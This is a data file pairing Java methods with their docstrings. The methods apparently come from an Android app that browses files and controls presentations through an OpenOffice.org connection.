1	public boolean isPresentation() { XServiceInfo xServiceInfo = (XServiceInfo) UnoRuntime.queryInterface( XServiceInfo.class, this.doc); if (xServiceInfo == null) { return false; } if (!xServiceInfo.supportsService( "com.sun.star.presentation.PresentationDocument")) { return false; } return true; }	Indicates whether this document is a presentation document.
1	public boolean equals(Object obj) { if (!(obj instanceof Document)) { return false; } if (this.url == null) { if (((Document) obj).url == null) { return this.name.equals(((Document) obj).name); } else { return false; } } else { return this.url.equals(((Document) obj).url); } }	Indicates whether some other object is "equal to" this one.
1	public void changeDirectory(String url) { this.pwd = url; this.isPwdRoot = this.isRoot(this.pwd); return; }	Changes the current working directory.
1	private String getOneLevelUpDirectory(String url) { String parent = null; if (this.isMSWindows) { if (this.isRoot(url)) { return this.p2u("C:\\"); } } parent = url.substring(0, url.lastIndexOf("/")); if (this.isRoot(parent + "/")) { return parent + "/"; } return parent; }	Returns one-level up to the parent directory
1	private String getTempDir() throws java.io.IOException { if (this.tempDir == null) { this.tempDir = (String) this.conn.getConfiguration( "/org.openoffice.Office.Common/Internal/CurrentTempURL"); this.tempDir += "/mpresent"; } return this.tempDir; }	Returns the URL of the temporary working directory.
1	private String _(String key) { try { return this.l10n.getString(key); } catch (java.util.MissingResourceException e) { return key; } }	Gets a string for the given key from this resource bundle or one of its parents. If the key is missing, returns the key itself.
1	public void reload(View btnReload) { TextView txtMessage = (TextView) this.findViewById(R.id.message); this.enableButtons(false); txtMessage.setText(""); this.redraw(); this.enableButtons(true); return; }	Reloads the server status and refreshes the screen.
1	private void enableButtons(boolean enable) { Button btnReload = (Button) this.findViewById(R.id.reload); Spinner spnParents = (Spinner) this.findViewById(R.id.parents); ListView lsvFiles = (ListView) this.findViewById(R.id.files); btnReload.setClickable(enable); spnParents.setClickable(enable); lsvFiles.setClickable(enable); return; }	Enables or disables all the buttons.
1	private String _(String key) { try { return this.l10n.getString(key); } catch (java.util.MissingResourceException e) { return key; } }	Gets a string for the given key from this resource bundle or one of its parents. If the key is missing, returns the key itself.
1	public void checkConnection() throws com.sun.star.comp.helper.BootstrapException, com.sun.star.connection.NoConnectException, com.sun.star.connection.ConnectionSetupException { if (!this.conn.isConnected()) { this.conn.connect(); this.fileNameConverter = this.conn.getFileNameConverterService(); this.slideRenderer = this.conn.getSlideRendererService(); } return; }	Checks the OpenOffice.org remote connection
1	public boolean isConnected() { if (this.serviceManager == null) { return false; } try { UnoRuntime.queryInterface( XPropertySet.class, this.serviceManager); } catch (com.sun.star.lang.DisposedException e) { this.serviceManager = null; return false; } return true; }	Returns whether the connection is on and alive.
1	public void onItemSelected(AdapterView?parent, View view, int position, long id) { FileAccess.PathURL path = (FileAccess.PathURL) ((Spinner) parent).getSelectedItem(); this.act.enableButtons(false); if (!path.getURL().equals(this.act.access.getPwd())) { this.act.access.changeDirectory(path.getURL()); this.act.redraw(); } this.act.enableButtons(true); return; }	Callback method to be invoked when an item in this AdapterView has been clicked.
1	public PathURL(String url, String display) { this.url = url; this.display = display; this.type = FileType.checkType(this.url); return; }	Creates a new instance of a path URL.
1	public boolean isAccepted(String url) { String lcUrl = null; if (this.access.isHidden(url)) { return false; } lcUrl = url.toLowerCase(); if (lcUrl.endsWith(".odp") || lcUrl.endsWith(".pptx") || lcUrl.endsWith(".ppt") || lcUrl.endsWith("sxi")) { return true; } return false; }	Checks if a file URL is accepted.
1	public void reload(View btnReload) { this.enableButtons(false); this.redraw(); this.enableButtons(true); return; }	Reloads the server status and refreshes the screen.
